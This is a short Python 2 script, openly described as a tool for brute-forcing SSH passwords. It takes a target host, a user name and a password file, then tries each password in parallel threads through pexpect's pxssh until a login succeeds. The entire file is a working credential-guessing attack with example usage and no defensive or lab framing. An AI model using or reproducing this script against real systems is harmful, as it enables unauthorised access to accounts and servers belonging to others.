'''
Script to brute force user credentials over SSH

Example usage:
	python ssh_pw_cracker.py -H 127.0.0.1 -u root -F passwords.txt
'''

import pxssh	# from pexpect module
import optparse # take arguments from command line
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def send_command(s, cmd):
	s.sendline(cmd)
	s.prompt()
	print s.before

def connect(host, user, pw, release):
	global Found
	global Fails

	try:
		s = pxssh.pxssh()
		s.login(host, user, pw)
		print '[+] Password found: ' + pw
		Found = True
	except Exception, e:
		if 'read_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host, user, pw, False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host, user, pw, False)
	finally:
		if release:
			connection_lock.release()

def main():
	# Get arguments
	parser = optparse.OptionParser('usage%prog -H <targetHost> -u <user> -F <passwordFile>')
	parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
	parser.add_option('-F', dest='pwFile', type='string', help='specify password file')
	parser.add_option('-u', dest='user', type='string', help='specify user')
	(options, args) = parser.parse_args()

	host = options.tgtHost
	pwFile = options.pwFile
	user = options.user

	# Wrong usage
	if host == None or pwFile == None or user == None:
		print parser.usage
		exit(0)
	
	# Open pw file
	f = open(pwFile, 'r')

	for line in f.readlines():
		if Found:
			print '[*] Exiting: Password found!'
			exit(0)
		if Fails > 5:
			print '[!] Exiting: Too many socket timeouts'
			exit(0)

		connection_lock.acquire()
		pw = line.strip('\r').strip('\n')
		print '[-] Testing: ' + str(pw)
		t = Thread(target=connect, args=(host, user, pw, True))
		t.start()

if __name__ == '__main__':
	main()

